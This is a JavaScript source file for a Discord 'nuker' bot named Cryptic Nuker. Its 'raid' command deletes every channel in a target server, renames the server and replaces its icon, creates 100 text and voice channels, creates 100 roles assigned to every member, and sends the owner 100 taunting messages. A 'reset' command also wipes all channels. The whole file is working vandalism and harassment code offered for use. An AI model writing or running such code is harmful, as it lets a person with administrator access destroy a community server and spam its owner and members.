const Discord = require("discord.js");
const { token, prefix, targetID } = require("./config.json");
const bot = new Discord.Client();
const colors = require("colors");
const { stripIndents } = require("common-tags");

// Process
process.on("unhandledRejection", error => { return })
process.on("uncaughtExceptionMonitor", error => { return })
process.on("uncaughtException", error => { return })
// Process

bot.on("ready", () => {
    if(targetID === "server-id-here" || targetID === "") {
        console.log(`${colors.red("[ERROR]:")} ${colors.yellow("No server id was provided")}`)
    } else {
        console.log(`
 

                   
         ▄████▄   ██▀███ ▓██   ██▓ ██▓███  ▄▄▄█████▓ ██▓ ▄████▄      ███▄    █  █    ██  ██ ▄█▀▓█████  ██▀███  
        ▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒▓██░  ██▒▓  ██▒ ▓▒▓██▒▒██▀ ▀█      ██ ▀█   █  ██  ▓██▒ ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
        ▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░▓██░ ██▓▒▒ ▓██░ ▒░▒██▒▒▓█    ▄    ▓██  ▀█ ██▒▓██  ▒██░▓███▄░ ▒███   ▓██ ░▄█ ▒
        ▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░▒██▄█▓▒ ▒░ ▓██▓ ░ ░██░▒▓▓▄ ▄██▒   ▓██▒  ▐▌██▒▓▓█  ░██░▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
        ▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░▒██▒ ░  ░  ▒██▒ ░ ░██░▒ ▓███▀ ░   ▒██░   ▓██░▒▒█████▓ ▒██▒ █▄░▒████▒░██▓ ▒██▒
        ░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ ▒▓▒░ ░  ░  ▒ ░░   ░▓  ░ ░▒ ▒  ░   ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
          ░  ▒     ░▒ ░ ▒░▓██ ░▒░ ░▒ ░         ░     ▒ ░  ░  ▒      ░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
        ░          ░░   ░ ▒ ▒ ░░  ░░         ░       ▒ ░░              ░   ░ ░  ░░░ ░ ░ ░ ░░ ░    ░     ░░   ░ 
        ░ ░         ░     ░ ░                        ░  ░ ░                  ░    ░     ░  ░      ░  ░   ░     
        ░                 ░ ░                           ░                                                      
 

                            

            ${colors.cyan("Cryptic Nuker")} ${colors.yellow(`v1.0.0`)} ${colors.magenta("|")} ${colors.cyan("Logged in as")} ${colors.yellow(bot.user.tag)} ${colors.magenta("|")} ${colors.cyan("ID:")} ${colors.yellow(bot.user.id)}
            ${colors.cyan("Prefix:")} ${colors.yellow(`${prefix}`)}
            ${targetID ? `${colors.cyan("Target Server:")} ${colors.yellow(bot.guilds.cache.get(targetID).name)} ${colors.magenta("|")} ${colors.cyan("ID:")} ${colors.yellow(bot.guilds.cache.get(targetID).id)}` : ""}
            ${colors.cyan("GitHub:")} ${colors.yellow("https://github.com/p9sq/cryptic-nuker")}
            ${colors.cyan("Developer:")} ${colors.yellow("p9sq#0594")}
    `)
    }
})

bot.on("message", async(message) => {
    let messageArray = message.content.split(" ");
    let cmd = messageArray[0].replace(prefix, "");
    let args = messageArray.slice(1);

    if(cmd === "help") {
        message.channel.send(stripIndents`Avalible commands for __**${bot.user.tag}**__
        
        **${prefix}reset** > Resets the server icon and channels
        **${prefix}raid** > Makes 100 voice and text channels, makes 100 roles, gives everyone all the roles the bot makes, and, sends the server owner 100 messages`)
    }

    if(cmd === "raid") {
        if(message.guild.id === targetID) {
            if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                message.guild.setIcon("https://i.gyazo.com/863bc487c8c72c3d21a747e300e3c21a.png")
                message.guild.setName("RAIDED BY CRYPTIC")
                message.guild.channels.cache.forEach(ch => {
                    ch.delete()
                })
                for (var i = 0; i < 100; i++) {
                    message.guild.channels.create("raided-by-cryptic", {
                        type: "text"
                    })
                }
                for (var i = 0; i < 100; i++) {
                    const Guild = message.guild.name
                    message.guild.members.cache.get(message.guild.ownerID).send(`Your server ${Guild} has been Raided :slight_smile:`).catch(err => { return })
                }
                for (var i = 0; i < 100; i++) {
                    message.guild.channels.create("Raided By Cryptic", {
                        type: "voice"
                    })
                }
                for (var i = 0; i < 100; i++) {
                    const newRole = await message.guild.roles.create({
                        data: {
                            name: "RAIDED BY CRYPTIC",
                            color: "#1B78E7"
                        }
                    })
                    message.guild.members.cache.forEach(member => {
                        member.roles.add(newRole)
                    })
                }
            }
        } else {
            if(message.deletable) {
                message.delete()
            }
            return console.log(`${colors.red("[ERROR]:")} ${colors.yellow("The command \"raid\" must be used in the target server")}`)
        }
    }

    if(cmd === "reset") {
        if(message.guild.id === targetID) {
            if(message.guild.me.hasPermission("ADMINISTRATOR")) {
                message.guild.setIcon(null)
                message.guild.channels.cache.forEach(ch => ch.delete())
                const textCat = await message.guild.channels.create("Text Channels", {
                    type: "category"
                })
                const voiceCat = await message.guild.channels.create("Voice Channels", {
                    type: "category"
                })
                message.guild.channels.create("general", {
                    type: "text",
                    parent: textCat.id
                })
                message.guild.channels.create("General", {
                    type: "voice",
                    parent: voiceCat.id
                })
            }
        } else {
            if(message.deletable) {
                message.delete()
            }
            return console.log(`${colors.red("[ERROR]:")} ${colors.yellow("The command \"reset\" must be used in the target server")}`)
        }
    }
})

if(token === "token-here" || token === "") {
    console.log(`${colors.red("[ERROR]:")} ${colors.yellow("An invalid token was provided")}`)
} else {
    bot.login(token)
}